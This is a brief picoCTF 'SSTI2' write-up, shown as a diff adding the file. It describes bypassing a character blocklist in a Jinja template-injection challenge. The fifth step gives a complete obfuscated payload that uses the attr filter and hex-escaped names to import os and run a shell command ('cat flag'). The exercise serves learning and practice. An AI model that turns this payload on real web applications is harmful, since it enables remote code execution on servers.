@@ -1,0 +1,16 @@
+picoctf ssti2 writeup
+
+1.try some payloads which are found on google 
+
+2.but after tried , i found that some character are blocked (like . ls [] etc...)
+
+3.i use some bypass methods but that is not ok
+
+4.so i just find other writeup and i know that i can use Jinja filter (same things like python syndax but different)
+
+5.just use buildin and python module ({{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}})
+
+6.get flag!
+
+
+#it is little difficult for me
